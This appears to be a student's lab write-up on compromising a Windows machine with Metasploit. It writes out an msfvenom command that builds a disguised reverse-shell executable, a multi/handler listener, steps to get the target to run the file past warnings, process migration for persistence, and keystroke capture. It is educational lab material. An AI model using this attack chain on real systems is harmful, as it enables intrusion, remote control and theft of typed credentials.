## Name: KAILASH KUMAR S
## Reg.No: 212223220041


# Compromising windows using Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
## OUTPUT:
<img width="559" height="277" alt="image" src="https://github.com/user-attachments/assets/29d8d519-1d66-4655-8c67-9379d8ee167b" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
<img width="758" height="122" alt="image" src="https://github.com/user-attachments/assets/3a3c3a1b-05b5-4f99-a72d-b66a52772bdb" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT
<img width="275" height="36" alt="image" src="https://github.com/user-attachments/assets/170aed41-fc1b-4d05-85bc-a6424ee251b2" />

Start apache server
sudo systemctl apache2 start
## OUTPUT
<img width="255" height="42" alt="image" src="https://github.com/user-attachments/assets/0bed5e34-5fe8-4967-acb7-75ab80da0daa" />

Check the status of apache2
## OUTPUT
<img width="718" height="289" alt="image" src="https://github.com/user-attachments/assets/6f7af485-2edc-47aa-a3d9-db2cf18f0a23" />

Invoke msfconsole:
## OUTPUT:
<img width="656" height="362" alt="image" src="https://github.com/user-attachments/assets/c154dde9-a4e8-4762-8897-58fd1c27eaad" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="774" height="487" alt="image" src="https://github.com/user-attachments/assets/c0673a51-89e8-4e56-8666-360f01b16cb7" />

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
## OUTPUT:
<img width="343" height="96" alt="image" src="https://github.com/user-attachments/assets/6f744324-46e7-4d32-b33d-e0f697b02791" />

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
## OUTPUT:
<img width="470" height="88" alt="image" src="https://github.com/user-attachments/assets/7a7dd7f2-271c-4035-88c7-38a85993c869" />

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT:
<img width="798" height="457" alt="image" src="https://github.com/user-attachments/assets/2606f3a7-b3c6-410d-9721-3048579889e1" />

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="157" height="29" alt="image" src="https://github.com/user-attachments/assets/e40a9e96-e755-4c2b-8af1-c15d2754ca3f" />

keyscan_dump Shows the keystrokes captured so far
## OUTPUT:
<img width="420" height="91" alt="image" src="https://github.com/user-attachments/assets/8e5de962-6b73-453d-9e92-f3ffef3aa86a" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
